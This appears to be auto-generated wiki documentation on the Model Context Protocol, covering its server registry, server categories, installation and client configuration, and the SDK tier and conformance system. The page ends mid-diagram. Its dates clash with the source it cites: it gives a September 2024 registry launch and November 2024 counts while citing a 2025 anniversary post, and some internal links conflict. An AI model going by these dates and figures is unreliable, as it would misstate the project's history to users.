The MCP Registry is the central index for discovering and publishing MCP servers. Since its launch in September 2024, the registry has grown to nearly 2,000 entries, representing a 407% growth rate from its initial batch of servers. This explosive growth demonstrates MCP's rapid adoption across the developer community.

This page explains the MCP Registry, the distinction between reference, official, and community servers, and provides guidelines for publishing and discovering servers in the ecosystem.

For building new servers, see [Building MCP Servers](#5.1). For implementation details of reference servers, see [Reference Server Implementations](#5.2).

## Server Categories

The MCP ecosystem organizes servers into three distinct categories based on maintenance and ownership:

| Category | Maintainer | Count | Characteristics |
|----------|-----------|-------|-----------------|
| **Reference Servers** | MCP Core Team | 7 active | Demonstrate SDK features, actively maintained, production-quality |
| **Official Integrations** | Platform Companies | Dozens | Company-maintained, platform-specific, first-party support |
| **Community Servers** | Independent Developers | ~2,000 | Varying quality and maintenance, diverse implementations |

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28](), [docs/examples.mdx:8-34]()

## Reference Servers

Reference servers are maintained by the MCP Core Team and demonstrate SDK capabilities. These 7 actively maintained servers serve as canonical examples of MCP implementations:

```mermaid
graph TB
    subgraph "Reference Server Implementations"
        REPO["modelcontextprotocol/servers"]
        
        EVERYTHING["server-everything<br/>@modelcontextprotocol/server-everything<br/>Prompts + Resources + Tools<br/>Test bed for all features"]
        
        FETCH["server-fetch<br/>@modelcontextprotocol/server-fetch<br/>Web content fetching<br/>Efficient LLM usage"]
        
        FILESYSTEM["server-filesystem<br/>@modelcontextprotocol/server-filesystem<br/>File operations<br/>Configurable access controls"]
        
        GIT["server-git<br/>@modelcontextprotocol/server-git<br/>Repository tools<br/>Read, search, manipulate"]
        
        MEMORY["server-memory<br/>@modelcontextprotocol/server-memory<br/>Knowledge graph<br/>Persistent memory system"]
        
        SEQUENTIAL["server-sequentialthinking<br/>@modelcontextprotocol/server-sequentialthinking<br/>Problem-solving<br/>Thought sequences"]
        
        TIME["server-time<br/>@modelcontextprotocol/server-time<br/>Time operations<br/>Timezone conversions"]
    end
    
    REPO --> EVERYTHING
    REPO --> FETCH
    REPO --> FILESYSTEM
    REPO --> GIT
    REPO --> MEMORY
    REPO --> SEQUENTIAL
    REPO --> TIME
```

**Diagram: Reference Server Implementations in modelcontextprotocol/servers**

Reference servers are distributed as npm packages (TypeScript) or Python packages and can be executed directly via `npx` or `uvx`. For detailed implementation guidance, see [Reference Server Implementations](#5.2).

**Sources**: [docs/examples.mdx:12-20]()

## Official Integrations

Official integrations are MCP servers maintained by companies for their own platforms. Examples include:

- **Notion**: [github.com/makenotion/notion-mcp-server](https://github.com/makenotion/notion-mcp-server) - Manage notes and databases
- **Stripe**: [docs.stripe.com/mcp#tools](https://docs.stripe.com/mcp#tools) - Payment workflow automation
- **GitHub**: [github.com/github/github-mcp-server](https://github.com/github/github-mcp-server) - Engineering process automation
- **Hugging Face**: [github.com/huggingface/hf-mcp-server](https://github.com/huggingface/hf-mcp-server) - Model management and dataset search
- **Postman**: [github.com/postmanlabs/postman-mcp-server](https://github.com/postmanlabs/postman-mcp-server) - API testing workflows

```mermaid
graph TB
    subgraph "Official Integration Characteristics"
        FIRSTPARTY["First-Party Support<br/>Maintained by platform owners<br/>Direct API access"]
        
        EXPERTISE["Platform Expertise<br/>Deep integration<br/>Platform-specific features"]
        
        UPDATES["Regular Updates<br/>Synchronized with platform changes<br/>Long-term support"]
        
        DOCS["Platform Documentation<br/>Setup guides<br/>Configuration examples"]
    end
    
    OFFICIAL["Official Integrations"] --> FIRSTPARTY
    OFFICIAL --> EXPERTISE
    OFFICIAL --> UPDATES
    OFFICIAL --> DOCS
```

**Diagram: Characteristics of Official Integration Servers**

Official integrations are listed in the [modelcontextprotocol/servers](https://github.com/modelcontextprotocol/servers) repository under the "Official Integrations" section. These servers benefit from direct platform knowledge and are typically maintained alongside the platforms themselves.

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:22-27](), [docs/examples.mdx:28-30]()

## The MCP Registry

The MCP Registry launched in September 2024 as the central index for discovering MCP servers. The registry provides a searchable database of community-contributed servers across all domains.

### Registry Growth and Adoption

```mermaid
graph LR
    SEPT["September 2024<br/>Registry Launch<br/>Initial batch of servers"]
    
    NOV["November 2024<br/>~2000 Servers<br/>407% Growth"]
    
    CATEGORIES["Server Categories<br/>Database integrations<br/>API connectors<br/>Development tools<br/>Data processing<br/>Domain-specific solutions"]
    
    SEPT -->|"3 months"| NOV
    NOV --> CATEGORIES
```

**Diagram: MCP Registry Growth Timeline**

Key metrics:
- **Launch**: September 2024
- **Current size**: ~2,000 servers (as of November 2024)
- **Growth rate**: 407% from initial batch
- **Diversity**: Servers span databases, APIs, tools, data processing, and specialized domains

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28]()

### Registry Structure

The MCP Registry serves as:

1. **Discovery platform**: Searchable index of available servers
2. **Quality signal**: Listed servers meet basic publication criteria
3. **Community showcase**: Demonstrates ecosystem breadth and creativity
4. **Integration hub**: Central location for finding solutions to specific needs

The registry complements the `modelcontextprotocol/servers` repository, which contains reference implementations and links to official integrations. The registry itself focuses on community-contributed servers across the broader ecosystem.

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28]()

## Community Servers

Community servers are independently developed and maintained by MCP ecosystem contributors. With ~2,000 servers in the registry, the community has created implementations across virtually every domain.

### Community Server Characteristics

```mermaid
graph TB
    subgraph "Implementation Diversity"
        LANGS["Languages<br/>TypeScript, Python, Go, Rust<br/>Java, C#, and more"]
        
        DOMAINS["Domains<br/>Databases, APIs, Tools<br/>Data processing, Custom solutions"]
        
        TRANSPORTS["Transports<br/>stdio (local)<br/>HTTP/SSE (remote)"]
    end
    
    subgraph "Quality Spectrum"
        PROD["Production-Ready<br/>Tests, documentation<br/>Active maintenance"]
        
        PROTO["Prototypes<br/>Experimental features<br/>Proof of concepts"]
        
        ARCHIVED_COMM["Unmaintained<br/>Historical implementations<br/>Forking candidates"]
    end
    
    COMMUNITY["Community Servers<br/>~2000 in Registry"] --> LANGS
    COMMUNITY --> DOMAINS
    COMMUNITY --> TRANSPORTS
    
    LANGS --> PROD
    DOMAINS --> PROTO
    TRANSPORTS --> ARCHIVED_COMM
```

**Diagram: Community Server Diversity and Quality Spectrum**

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28](), [docs/examples.mdx:32-34]()

### Discovery Mechanisms

Find community servers through multiple channels:

| Channel | Description | Best For |
|---------|-------------|----------|
| **MCP Registry** | Searchable index at [registry URL] | Browsing by category, keyword search |
| **servers Repository** | [github.com/modelcontextprotocol/servers](https://github.com/modelcontextprotocol/servers) Community section | Curated popular servers, official links |
| **GitHub Discussions** | [github.com/orgs/modelcontextprotocol/discussions](https://github.com/orgs/modelcontextprotocol/discussions) | New server announcements, community feedback |
| **Discord** | MCP community Discord server | Real-time discovery, implementation help |

**Sources**: [docs/examples.mdx:32-34]()

### Evaluation Criteria

When selecting community servers, evaluate:

1. **Maintenance status**: Recent commits, active issue responses
2. **Documentation**: Setup instructions, configuration examples, API documentation
3. **Security**: Code review for credential handling, input validation, dependency security
4. **Testing**: Unit tests, integration tests, test coverage
5. **License**: MIT, Apache 2.0, or compatible license for your use case
6. **Community**: GitHub stars, forks, contributor count, issue activity

**Sources**: [docs/examples.mdx:32-34]()

## Publishing Servers to the Registry

Publishing your server to the MCP Registry makes it discoverable to the broader community.

### Publication Guidelines

```mermaid
graph TB
    subgraph "Pre-Publication Requirements"
        IMPL["Implementation<br/>Working MCP server<br/>Reference documentation"]
        
        DOCS["Documentation<br/>README with setup<br/>Configuration examples"]
        
        LICENSE["License<br/>Open source license<br/>Clear terms"]
        
        REPO["Repository<br/>Public GitHub/GitLab<br/>Version control"]
    end
    
    subgraph "Registry Submission"
        METADATA["Server Metadata<br/>Name, description<br/>Category, keywords"]
        
        VALIDATION["Validation<br/>Meets publication criteria<br/>No conflicts"]
        
        APPROVAL["Approval<br/>Community or maintainer review<br/>Listed in registry"]
    end
    
    IMPL --> METADATA
    DOCS --> METADATA
    LICENSE --> METADATA
    REPO --> METADATA
    
    METADATA --> VALIDATION
    VALIDATION --> APPROVAL
```

**Diagram: Server Publication Process Flow**

### Metadata Requirements

Servers in the registry include:

- **Name**: Unique identifier for the server
- **Description**: Clear explanation of functionality
- **Category**: Database, API, Tool, Data Processing, or Custom
- **Language**: Primary implementation language
- **Transport**: stdio, HTTP/SSE, or both
- **Repository URL**: Link to source code
- **Package URL**: npm, PyPI, or other package manager link
- **Keywords**: Searchable terms for discovery

### Quality Standards

Published servers should meet minimum quality standards:

1. **Functionality**: Server implements at least one MCP capability (tools, resources, or prompts)
2. **Documentation**: README explains installation, configuration, and usage
3. **Security**: No hardcoded credentials, proper input validation
4. **License**: Open source license compatible with community use
5. **Versioning**: Semantic versioning for releases

**Sources**: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:28]()

## Discovering and Using Servers

### Installation Methods

Servers can be executed using language-specific package managers:

**TypeScript/JavaScript Servers** (via `npx`):
```bash
# Direct execution without installation
npx -y @modelcontextprotocol/server-memory

# Reference servers
npx -y @modelcontextprotocol/server-filesystem /allowed/path
```

**Python Servers** (via `uvx` or `pip`):
```bash
# Using uvx (recommended)
uvx mcp-server-git

# Using pip
pip install mcp-server-git
python -m mcp_server_git
```

**Other Languages**:
- **Go**: Build and run binary directly
- **Rust**: `cargo run` or distribute compiled binary
- **Java/Kotlin**: Package as JAR and execute via `java -jar`

**Sources**: [docs/examples.mdx:38-55]()

### Client Configuration

Configure servers in MCP clients like Claude Desktop by adding entries to the configuration file:

```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    },
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/path/to/allowed/files"
      ]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "<YOUR_TOKEN>"
      }
    }
  }
}
```

**Configuration Structure**:
- **command**: Executable (`npx`, `uvx`, `python`, `node`, binary path)
- **args**: Command-line arguments including package name or script path
- **env**: Environment variables for API keys and configuration

**Sources**: [docs/examples.mdx:57-84]()

## Archived Servers

Some servers have been archived and moved to [github.com/modelcontextprotocol/servers-archived](https://github.com/modelcontextprotocol/servers-archived). These implementations are no longer actively maintained and serve as historical reference only.

### Why Servers Are Archived

Servers may be archived due to:
- Maintenance burden requiring ongoing API updates
- Security concerns with external integrations
- Better suited as community-maintained projects
- Superseded by improved implementations

⚠️ **Warning**: Archived servers may contain outdated dependencies, security vulnerabilities, or protocol incompatibilities. Use them as reference implementations for building new servers, not for production deployments.

### Notable Archived Servers

The archived repository includes servers for:
- **Databases**: PostgreSQL, SQLite
- **Development Tools**: GitHub, GitLab, Sentry
- **Web Automation**: Puppeteer, Brave Search
- **Communication**: Slack, Google Maps
- **AI Tools**: EverArt, AWS Knowledge Base Retrieval

For current alternatives, search the MCP Registry or community servers section. Many archived server functionalities have been reimplemented by the community with modern dependencies and improved features.

**Sources**: [docs/examples.mdx:22-24]()

## Additional Resources

### Community Engagement

- **GitHub Discussions**: https://github.com/orgs/modelcontextprotocol/discussions
- **MCP Servers Repository**: https://github.com/modelcontextprotocol/servers
- **Servers Archived Repository**: https://github.com/modelcontextprotocol/servers-archived
- **Discord Community**: Real-time discussions about server implementations

### Related Documentation

- [Building MCP Servers](#5.2): Guide to implementing custom servers
- [Reference Server Implementations](#5.3): Current actively maintained servers
- [Quick Start Guide](#5.1): Getting started with MCP servers and Claude configuration

**Sources**: [docs/examples.mdx:113-117]()

---

# Page: SDK Ecosystem

# SDK Ecosystem

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/community/sdk-tiers.mdx](docs/community/sdk-tiers.mdx)
- [docs/docs/develop/connect-local-servers.mdx](docs/docs/develop/connect-local-servers.mdx)
- [docs/docs/getting-started/intro.mdx](docs/docs/getting-started/intro.mdx)
- [docs/docs/sdk.mdx](docs/docs/sdk.mdx)
- [docs/docs/tools/inspector.mdx](docs/docs/tools/inspector.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/legacy/concepts/architecture.mdx](docs/legacy/concepts/architecture.mdx)
- [docs/legacy/concepts/sampling.mdx](docs/legacy/concepts/sampling.mdx)
- [docs/legacy/tools/debugging.mdx](docs/legacy/tools/debugging.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



## Purpose and Scope

This document describes the MCP SDK ecosystem: the collection of official language-specific SDKs that enable developers to build MCP clients and servers. It covers the tier classification system that establishes quality and maintenance expectations, the available SDKs across 10+ languages, conformance testing mechanisms, and the development guidelines for SDK maintainers.

For information about building MCP servers and clients using these SDKs, see [Building MCP Servers](#5.1) and [Building MCP Clients](#5.1). For governance and community structure around SDK development, see [Governance and Community](#8). For protocol specification details that SDKs implement, see [Protocol Specification](#2).

## Overview

The MCP SDK ecosystem provides standardized implementations of the Model Context Protocol across multiple programming languages. Each SDK enables developers to:

- Create MCP servers that expose tools, resources, and prompts
- Build MCP clients that connect to any MCP server
- Support local (stdio) and remote (HTTP/SSE) transport protocols
- Maintain protocol compliance with type safety

The ecosystem is organized into three tiers based on feature completeness, maintenance commitment, and documentation quality. This tiering system helps developers choose the right SDK for their needs and provides SDK maintainers with a clear path to improving adoption expectations.

## SDK Tier System

The MCP SDK Tiering System establishes three classification levels for official and community SDKs:

### Tier 1: Fully Supported

Tier 1 SDKs provide complete protocol implementation including all non-experimental features and optional capabilities. They require:

- **100% conformance test pass rate** against applicable required tests
- **New protocol features** implemented before or concurrent with spec version releases (timeline agreed per release)
- **Issue triage** within 2 business days
- **Critical bug resolution** (P0 issues) within 7 days
- **Stable release** with clear versioning (e.g., version 1.0.0 or higher)
- **Comprehensive documentation** with examples for all features
- **Published dependency update policy**
- **Published roadmap** with concrete implementation steps

### Tier 2: Commitment to Full Support

Tier 2 SDKs are actively maintained and working toward full protocol specification support. They require:

- **80% conformance test pass rate** against applicable required tests
- **New protocol features** implemented within 6 months of spec release
- **Issue triage** within one month
- **Critical bug resolution** within two weeks
- **At least one stable release**
- **Basic documentation** covering core features
- **Published dependency update policy**
- **Published plan** toward Tier 1 or explanation for remaining Tier 2

### Tier 3: Experimental

Tier 3 SDKs are experimental, partially implemented, or specialized. They have:

- **No minimum conformance requirement**
- **No timeline commitment** for new features
- **No issue triage requirement**
- **No critical bug resolution requirement**
- **No stable release requirement**
- **No documentation minimum**

Experimental features (such as Tasks) and protocol extensions (such as MCP Apps) are not required for any tier.

Sources: [docs/community/sdk-tiers.mdx:1-142]()

## Conformance Testing

All SDKs are evaluated using automated conformance tests that validate protocol support against published specifications. The conformance test suite is located in the [modelcontextprotocol/conformance](https://github.com/modelcontextprotocol/conformance) repository.

### Conformance Scoring

Conformance scores are calculated against **applicable required tests only**:

- Tests for the specification version the SDK targets
- Excluding tests marked as pending or skipped
- Excluding tests for experimental features
- Excluding legacy backward-compatibility tests (unless the SDK claims legacy support)

Tier requirements:
- **Tier 1**: 100% conformance required
- **Tier 2**: 80% conformance required
- **Tier 3**: No minimum requirement

### Tier Advancement and Relegation

SDK maintainers can request tier advancement by:

1. Self-assessing against tier requirements
2. Opening an issue in the [modelcontextprotocol/modelcontextprotocol](https://github.com/modelcontextprotocol/modelcontextprotocol) repository with supporting evidence
3. Passing automated conformance testing
4. Receiving approval from SDK Working Group maintainers

An SDK may be moved to a lower tier if existing conformance tests on the latest stable release fail continuously for 4 weeks:

- **Tier 1 → Tier 2**: Any conformance test fails
- **Tier 2 → Tier 3**: More than 20% of conformance tests fail

Sources: [docs/community/sdk-tiers.mdx:59-98]()

## Issue Triage Labels

SDK repositories must use consistent labels to enable automated reporting on issue handling metrics. Tier calculations use these metrics to measure triage response times and critical bug resolution times.

### Type Labels (pick one)

| Label | Description |
|-------|-------------|
| `bug` | Something isn't working |
| `enhancement` | Request for new feature |
| `question` | Further information requested |

Repositories using [GitHub's native issue types](https://docs.github.com/en/issues/tracking-your-work-with-issues/using-issues/managing-issue-types-in-an-organization) satisfy this requirement without needing type labels.

### Status Labels (pick one)

| Label | Description |
|-------|-------------|
| `needs confirmation` | Unclear if still relevant |
| `needs repro` | Insufficient information to reproduce |
| `ready for work` | Has enough information to start |
| `good first issue` | Good for newcomers |
| `help wanted` | Contributions welcome from those familiar with codebase |

### Priority Labels (only if actionable)

| Label | Description |
|-------|-------------|
| `P0` | Critical: core functionality failures or high-severity security |
| `P1` | Significant bug affecting many users |
| `P2` | Moderate issues, valuable feature requests |
| `P3` | Nice to haves, rare edge cases |

**P0 (Critical)** issues are:

- **Security vulnerabilities** with CVSS score ≥ 7.0 (High or Critical severity)
- **Core functionality failures** that prevent basic MCP operations: connection establishment, message exchange, or use of core primitives (tools, resources, prompts)

Sources: [docs/community/sdk-tiers.mdx:99-142]()

## Available SDKs

The following table lists all official SDKs with their current tier status and repository locations:

| SDK | Repository | Tier Status |
|-----|-----------|-------------|
| TypeScript | [modelcontextprotocol/typescript-sdk](https://github.com/modelcontextprotocol/typescript-sdk) | Tier 1 |
| Python | [modelcontextprotocol/python-sdk](https://github.com/modelcontextprotocol/python-sdk) | TBD |
| Java | [modelcontextprotocol/java-sdk](https://github.com/modelcontextprotocol/java-sdk) | TBD |
| C# | [modelcontextprotocol/csharp-sdk](https://github.com/modelcontextprotocol/csharp-sdk) | TBD |
| Go | [modelcontextprotocol/go-sdk](https://github.com/modelcontextprotocol/go-sdk) | TBD |
| Kotlin | [modelcontextprotocol/kotlin-sdk](https://github.com/modelcontextprotocol/kotlin-sdk) | TBD |
| Swift | [modelcontextprotocol/swift-sdk](https://github.com/modelcontextprotocol/swift-sdk) | TBD |
| Rust | [modelcontextprotocol/rust-sdk](https://github.com/modelcontextprotocol/rust-sdk) | TBD |
| Ruby | [modelcontextprotocol/ruby-sdk](https://github.com/modelcontextprotocol/ruby-sdk) | TBD |
| PHP | [modelcontextprotocol/php-sdk](https://github.com/modelcontextprotocol/php-sdk) | TBD |

Official tier assignments will be published February 23, 2026. See [SDK Tiering System](#sdk-tier-system) for details.

Sources: [docs/docs/sdk.mdx:1-24]()

## SDK Architecture and Common Patterns

All official SDKs follow a consistent layered architecture that separates concerns across protocol, session, and transport layers. This architecture enables language-specific idioms while maintaining protocol compliance.

### Layered Architecture

```mermaid
graph TB
    subgraph "Application Layer"
        APP["Application Code<br/>Server/Client Implementation"]
    end
    
    subgraph "SDK Layer"
        subgraph "Client/Server Layer"
            MCPCLIENT["McpClient<br/>Client-side protocol operations"]
            MCPSERVER["McpServer<br/>Server-side protocol operations"]
        end
        
        subgraph "Session Layer"
            SESSION["McpSession<br/>Communication patterns & state"]
        end
        
        subgraph "Transport Layer"
            STDIO["StdioTransport<br/>stdin/stdout"]
            HTTP["StreamableHttpTransport<br/>HTTP + SSE"]
            SSE["SseTransport<br/>Server-Sent Events"]
        end
    end
    
    APP --> MCPCLIENT
    APP --> MCPSERVER
    MCPCLIENT --> SESSION
    MCPSERVER --> SESSION
    SESSION --> STDIO
    SESSION --> HTTP
    SESSION --> SSE
    
    style APP fill:none,stroke:none
    style MCPCLIENT fill:none,stroke:none
    style MCPSERVER fill:none,stroke:none
    style SESSION fill:none,stroke:none
    style STDIO fill:none,stroke:none
    style HTTP fill:none,stroke:none
    style SSE fill:none,stroke:none
```

**Diagram: SDK Layered Architecture**

Sources: [docs/sdk/java/mcp-overview.mdx:49-77]()

### Core SDK Components

Each SDK provides:

1. **Client Implementation** (`McpClient` or language equivalent)
   - Establishes connections with MCP servers
   - Handles capability negotiation
   - Manages tool discovery and execution
   - Accesses resources and prompts
   - Supports optional features (sampling, elicitation, roots)

2. **Server Implementation** (`McpServer` or language equivalent)
   - Accepts client connections
   - Negotiates capabilities
   - Exposes tools, resources, and prompts
   - Handles logging and progress tracking
   - Manages concurrent client connections

3. **Transport Implementations**
   - **Stdio**: For local process-based communication
   - **Streamable HTTP**: For remote HTTP-based communication with bidirectional streaming
   - **SSE**: For Server-Sent Events streaming

4. **Type-Safe Protocol Bindings**
   - JSON-RPC message serialization/deserialization
   - Request/response correlation
   - Error handling with standard error codes
   - Notification handling

### Synchronous and Asynchronous APIs

Most SDKs provide both synchronous and asynchronous programming models to accommodate different application architectures:

- **Sync API**: Blocking calls suitable for imperative code
- **Async API**: Non-blocking calls using language-native async patterns (Promises, Futures, Coroutines, etc.)

Sources: [docs/sdk/java/mcp-overview.mdx:49-77](), [docs/sdk/java/mcp-client.mdx:14-150](), [docs/sdk/java/mcp-server.mdx:14-107]()

## SDK Feature Support Matrix

The following table shows which MCP features are supported across different SDK tiers:

| Feature | Tier 1 | Tier 2 | Tier 3 | Notes |
|---------|--------|--------|--------|-------|
| **Core Protocol** | ✓ | ✓ | Partial | JSON-RPC, lifecycle, capabilities |
| **Tools** | ✓ | ✓ | Partial | Tool discovery and execution |
| **Resources** | ✓ | ✓ | Partial | URI-based resource access |
| **Prompts** | ✓ | ✓ | Partial | Prompt templates and execution |
| **Sampling** | ✓ | ✓ | Optional | Server-initiated LLM requests |
| **Elicitation** | ✓ | ✓ | Optional | User input collection |
| **Roots** | ✓ | ✓ | Optional | Filesystem boundary definitions |
| **Logging** | ✓ | ✓ | Optional | Structured logging to clients |
| **Progress** | ✓ | ✓ | Optional | Long-running operation tracking |
| **Completion** | ✓ | ✓ | Optional | Argument autocompletion |
| **Tasks** | Optional | Optional | Optional | Experimental feature |
| **MCP Apps** | Optional | Optional | Optional | Extension feature |

Sources: [docs/community/sdk-tiers.mdx:19-29]()

## SDK Development Guidelines

### Transport Selection

SDKs should provide implementations for:

1. **Stdio Transport** (required)
   - Uses standard input/output for communication
   - Ideal for local processes
   - Efficient for same-machine communication
   - Simple process management

2. **Streamable HTTP Transport** (required)
   - Uses HTTP with optional Server-Sent Events for streaming
   - HTTP POST for client-to-server messages
   - GET/SSE for server-to-client streaming
   - Suitable for remote scenarios

3. **SSE Transport** (optional)
   - Server-Sent Events for unidirectional server-to-client streaming
   - Useful for specific deployment patterns

### Message Handling Best Practices

1. **Request Processing**
   - Validate inputs thoroughly
   - Use type-safe schemas
   - Handle errors gracefully
   - Implement timeouts

2. **Progress Reporting**
   - Use progress tokens for long operations
   - Report progress incrementally
   - Include total progress when known

3. **Error Management**
   - Use appropriate error codes from the specification
   - Include helpful error messages
   - Clean up resources on errors
   - Distinguish between protocol errors and application errors

### Documentation Requirements

Tier 1 SDKs must provide:
- Installation and setup instructions
- Quick-start examples for clients and servers
- API reference documentation
- Examples for all major features
- Transport selection guidance
- Error handling patterns
- Security best practices

Tier 2 SDKs must provide:
- Installation instructions
- Basic API documentation
- Core feature examples
- Common patterns

Sources: [docs/legacy/concepts/architecture.mdx:288-362]()

## SDK Implementation Reference: Java SDK

The Java SDK serves as a reference implementation demonstrating the layered architecture and feature completeness expected of Tier 1 SDKs.

### Java SDK Structure

The Java SDK is organized into modules:

- **Core Module** (`io.modelcontextprotocol.sdk:mcp`)
  - `McpClient` and `McpServer` implementations
  - Stdio, Streamable HTTP, and SSE transports
  - No external web framework dependencies

- **Spring WebFlux Module** (`io.modelcontextprotocol.sdk:mcp-spring-webflux`)
  - WebFlux-based client and server transports
  - Reactive HTTP streaming
  - Optional for Spring Framework users

- **Spring WebMVC Module** (`io.modelcontextprotocol.sdk:mcp-spring-webmvc`)
  - WebMVC-based server transports
  - Servlet-based HTTP streaming
  - Optional for Spring Framework users

- **Test Module** (`io.modelcontextprotocol.sdk:mcp-test`)
  - Testing utilities and support

### Java Client Implementation

The Java SDK provides both synchronous and asynchronous client APIs. The sync API uses `McpSyncClient` [docs/sdk/java/mcp-client.mdx:41-91]() while the async API uses `McpAsyncClient` [docs/sdk/java/mcp-client.mdx:95-150]().

Key client capabilities:

- **Tool Execution**: `listTools()` and `callTool(name, params)`
- **Resource Access**: `listResources()` and `readResource(uri)`
- **Prompt System**: `listPrompts()` and `executePrompt(name, params)`
- **Roots Management**: `addRoot()`, `removeRoot()`, `rootsListChangedNotification()`
- **Sampling Support**: Register sampling handler via `sampling(handler)`
- **Elicitation Support**: Register elicitation handler via `elicitation(handler)`
- **Change Notifications**: Register consumers for tools, resources, and prompts changes
- **Logging**: Register logging consumer and set logging level
- **Progress**: Register progress consumer for operation tracking

### Java Server Implementation

The Java SDK provides both synchronous and asynchronous server APIs. The sync API uses `McpSyncServer` [docs/sdk/java/mcp-server.mdx:37-58]() while the async API uses `McpAsyncServer` [docs/sdk/java/mcp-server.mdx:73-104]().

Key server capabilities:

- **Tool Registration**: `addTool(toolSpecification)` with handler
- **Resource Registration**: `addResource(resourceSpecification)` with handler
- **Prompt Registration**: `addPrompt(promptSpecification)` with handler
- **Capability Configuration**: `ServerCapabilities` builder for resources, tools, prompts, logging, completions
- **Transport Support**: Stdio, Streamable HTTP, SSE with Spring WebFlux/WebMVC options

### Java Transport Implementations

The Java SDK provides multiple transport options:

**Stdio Transport** [docs/sdk/java/mcp-server.mdx:117-133]()
- `StdioServerTransportProvider` for servers
- `StdioClientTransport` for clients
- Bidirectional JSON-RPC over stdin/stdout

**Streamable HTTP Transport** [docs/sdk/java/mcp-server.mdx:135-244]()
- `WebFluxStreamableServerTransportProvider` (WebFlux)
- `WebMvcStreamableServerTransportProvider` (WebMVC)
- `HttpServletStreamableServerTransportProvider` (Servlet)
- `HttpClientStreamableHttpTransport` (client)
- `WebClientStreamableHttpTransport` (client with WebClient)

**Stateless Streamable HTTP Transport** [docs/sdk/java/mcp-server.mdx:175-219]()
- `WebFluxStatelessServerTransport` (WebFlux)
- `WebMvcStatelessServerTransport` (WebMVC)
- `HttpServletStatelessServerTransport` (Servlet)
- For cloud-native deployments without session state

**SSE Transport** [docs/sdk/java/mcp-server.mdx:220-243]()
- `WebFluxSseServerTransportProvider` (WebFlux)
- `WebMvcSseServerTransportProvider` (WebMVC)
- `HttpServletSseServerTransportProvider` (Servlet)
- Server-Sent Events for unidirectional streaming

Sources: [docs/sdk/java/mcp-overview.mdx:1-196](), [docs/sdk/java/mcp-client.mdx:1-598](), [docs/sdk/java/mcp-server.mdx:1-800]()

## SDK Ecosystem Diagram

```mermaid
graph TB
    subgraph "Official SDKs"
        TS["TypeScript SDK<br/>Tier 1<br/>modelcontextprotocol/typescript-sdk"]
        PY["Python SDK<br/>TBD<br/>modelcontextprotocol/python-sdk"]
        JAVA["Java SDK<br/>TBD<br/>modelcontextprotocol/java-sdk"]
        CS["C# SDK<br/>TBD<br/>modelcontextprotocol/csharp-sdk"]
        GO["Go SDK<br/>TBD<br/>modelcontextprotocol/go-sdk"]
        KT["Kotlin SDK<br/>TBD<br/>modelcontextprotocol/kotlin-sdk"]
        SW["Swift SDK<br/>TBD<br/>modelcontextprotocol/swift-sdk"]
        RS["Rust SDK<br/>TBD<br/>modelcontextprotocol/rust-sdk"]
        RB["Ruby SDK<br/>TBD<br/>modelcontextprotocol/ruby-sdk"]
        PHP["PHP SDK<br/>TBD<br/>modelcontextprotocol/php-sdk"]
    end
    
    subgraph "Quality Assurance"
        CONFORM["Conformance Tests<br/>modelcontextprotocol/conformance<br/>Tier 1: 100%<br/>Tier 2: 80%"]
        LABELS["Issue Triage Labels<br/>Type, Status, Priority<br/>Automated Reporting"]
    end
    
    subgraph "Protocol Specification"
        SPEC["MCP Specification<br/>JSON-RPC 2.0<br/>Tools, Resources, Prompts<br/>Sampling, Elicitation, Roots"]
    end
    
    subgraph "Governance"
        WG["SDK Working Group<br/>Tier Advancement<br/>Tier Relegation<br/>Feature Approval"]
    end
    
    TS --> CONFORM
    PY --> CONFORM
    JAVA --> CONFORM
    CS --> CONFORM
    GO --> CONFORM
    KT --> CONFORM
    SW --> CONFORM
    RS --> CONFORM
    RB --> CONFORM
    PHP --> CONFORM
    
    CONFORM --> LABELS
    
    TS --> SPEC
    PY --> SPEC
    JAVA --> SPEC
    CS --> SPEC
    GO --> SPEC
    KT --> SPEC
    SW --> SPEC
    RS --> SPEC
    RB --> SPEC
    PHP --> SPEC
    
    CONFORM --> WG
    LABELS --> WG
    
    style TS fill:none,stroke:none
    style PY fill:none,stroke:none
    style JAVA fill:none,stroke:none
    style CS fill:none,stroke:none
    style GO fill:none,stroke:none
    style KT fill:none,stroke:none
    style SW fill:none,stroke:none
    style RS fill:none,stroke:none
    style RB fill:none,stroke:none
    style PHP fill:none,stroke:none
    style CONFORM fill:none,stroke:none
    style LABELS fill:none,stroke:none
    style SPEC fill:none,stroke:none
    style WG fill:none,stroke:none
```

**Diagram: SDK Ecosystem Overview**

Sources: [docs/docs/sdk.mdx:1-24](), [docs/community/sdk-tiers.mdx:1-142]()

## SDK Development Workflow

```mermaid
graph LR
    subgraph "Development"
        DEV["SDK Development<br/>Implement protocol features<br/>Add transport support<br/>Write documentation"]
    end
    
    subgraph "Testing"
        UNIT["Unit Tests<br/>Language-specific"]
        CONFORM["Conformance Tests<br/>modelcontextprotocol/conformance<br/>Automated validation"]
    end
    
    subgraph "Quality Gates"
        PASS["Pass Rate Check<br/>Tier 1: 100%<br/>Tier 2: 80%"]
        TRIAGE["Issue Triage<br/>Type, Status, Priority<br/>Response time SLA"]
    end
    
    subgraph "Tier Assignment"
        TIER["Tier Classification<br/>Tier 1: Fully Supported<br/>Tier 2: Commitment<br/>Tier 3: Experimental"]
    end
    
    subgraph "Maintenance"
        MAINT["Ongoing Maintenance<br/>Bug fixes<br/>New features<br/>Documentation updates"]
    end
    
    DEV --> UNIT
